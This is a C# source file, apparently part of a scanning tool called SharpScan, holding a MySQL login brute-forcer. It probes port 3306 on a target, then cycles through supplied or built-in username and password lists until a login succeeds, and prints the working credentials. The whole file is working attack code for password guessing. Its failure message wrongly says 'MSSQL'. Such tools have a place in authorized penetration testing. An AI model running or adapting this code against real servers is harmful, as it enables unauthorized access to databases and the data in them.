using System;
using System.Collections.Generic;
using MySql.Data.MySqlClient;

namespace SharpScan
{
    public class MySqlBroute
    {
        public static void Run(string host)
        {
            int Port = 3306;
            if (!Helper.TestPort(host, Port))
            {
                return;
            }
            if (!string.IsNullOrEmpty(Program.userName) && !string.IsNullOrEmpty(Program.passWord))
            {
                bool isConnected = MySQL_Connect(host, Program.userName, Program.passWord);
                if (isConnected)
                {
                    Helper.ColorfulConsole($"MYSQL login successful with user: {Program.userName} ,  password: {Program.passWord}", ConsoleColor.Green);
                    return;
                }
            }
            else if (Program.userList != null && Program.passwordList != null)
            {
                foreach (var user in Program.userList)
                {
                    foreach (var password in Program.passwordList)
                    {

                        bool isConnected = MySQL_Connect(host, user, password);
                        if (isConnected)
                        {
                            Helper.ColorfulConsole($"MYSQL login successful with user: {user} ,  password: {password}", ConsoleColor.Green);
                            return;
                        }
                    }
                }
            }
            else if (Configuration.UserDictionary.TryGetValue("mysql", out List<string> mysqlUsers))
            {
                foreach (var user in mysqlUsers)
                {
                    foreach (var password in Configuration.Passwords)
                    {
                        string formattedPassword = password.Replace("{user}", user);
                        bool isConnected = MySQL_Connect(host, user, formattedPassword);
                        if (isConnected)
                        {
                            Helper.ColorfulConsole($"MYSQL login successful with user: {user} ,  password: {formattedPassword}", ConsoleColor.Green);
                            return;
                        }
                    }
                }

            }

            Helper.ColorfulConsole("[-] MSSQL login failed with all provided credentials.", ConsoleColor.Red);
        }

        public static bool MySQL_Connect(string server, string username, string password, string port = "3306")
        {
            string connectStr = $"server={server};port={port};database=information_schema;user={username};password={password};";
            using (MySqlConnection conn = new MySqlConnection(connectStr))
            {
                try
                {
                    conn.Open();
                    return true;
                }
                catch (Exception e)
                {
                    return false;
                }
            }
        }
    }
}
